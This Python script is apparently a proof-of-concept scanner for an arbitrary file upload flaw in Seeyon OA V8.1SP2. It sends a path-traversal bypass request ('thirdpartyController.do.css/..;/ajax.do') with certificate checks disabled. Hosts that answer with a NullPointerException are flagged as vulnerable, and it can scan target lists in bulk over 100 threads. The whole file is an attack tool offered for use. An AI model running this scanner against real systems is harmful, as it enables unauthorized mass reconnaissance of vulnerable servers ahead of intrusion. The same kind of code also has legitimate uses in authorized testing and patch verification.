import argparse,requests
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def banner():
    test = """
        ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗         ███████╗██╗██╗     ███████╗
        ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗        ██╔════╝██║██║     ██╔════╝
        ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║        █████╗  ██║██║     █████╗  
        ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║        ██╔══╝  ██║██║     ██╔══╝  
        ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║     ██║███████╗███████╗
         ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝                                                                                      
                                                                                          author: 秋妤
                                                                                          date: 2024.09.02
                                                                                          version: 1.0
    """
    print(test)


def poc(target):
    payload = '/seeyon/thirdpartyController.do.css/..;/ajax.do'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "loginPageURL": "",
        "login_locale": "zh_CN"
    }

    try:
        res1 = requests.get(target)
        if res1.status_code == 200:
            res2 = requests.get(target + payload, headers=headers, verify=False, timeout=5)
            if 'java.lang.NullPointerException:null' in res2.text:
                with open('致远OA_V8.1SP2文件上传漏洞_result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在任意文件上传\n")
                    print(f"[+]{target}存在任意文件上传")
            else:
                print(f"[-]{target}不存在任意文件上传")
        else:
            print(f"该{target}可能存在问题，请手动检测")
    except Exception as e:
        print(e)


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="这是一个致远OA_V8.1SP2文件上传漏洞的扫描脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parse.parse_args()
    try:
        if args.url and not args.file:
            poc(args.url)
        elif args.file and not args.url:
            with open(args.file, 'r', encoding='utf-8') as f:
                for url in f.readlines():
                    url_list.append(url.strip().replace("\n", ""))
                mp = Pool(100)
                mp.map(poc, url_list)
                mp.close()
                mp.join()
        else:
            print("您的输入有误，请使用python3 file_name.py -h for help")
    except Exception as e:
        print(e)



if __name__ == '__main__':
    main()
